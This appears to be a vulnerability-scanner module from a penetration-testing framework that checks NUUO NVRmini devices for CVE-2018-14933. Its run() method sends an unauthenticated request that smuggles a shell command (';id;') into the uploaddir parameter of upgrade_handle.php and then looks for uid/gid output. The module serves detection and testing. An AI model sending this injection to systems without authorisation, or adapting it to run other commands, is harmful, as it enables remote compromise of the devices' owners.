#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NUUO NVRmini is vulnerable to unauthenticated remote command execution through the upgrade_handle."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NUUO NVRmini - Remote Command Execution Detection',
        'description': 'NUUO NVRmini is vulnerable to unauthenticated remote command execution through the upgrade_handle.php file. The vulnerability allows an attacker to execute arbitrary commands by manipulating the uploaddir parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'nuuo', 'rce', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/45070',
            'https://www.cve.org/CVERecord?id=CVE-2018-14933',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14933',
        ],
        'cve': 'CVE-2018-14933',
    }

    def run(self):
        r = self.http_request(method="GET", path='/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=[0-9]+.*gid=[0-9]+.*',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="NUUO NVRmini - Remote Command Execution detected",
                path='/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27',
            )
            return True
        return False

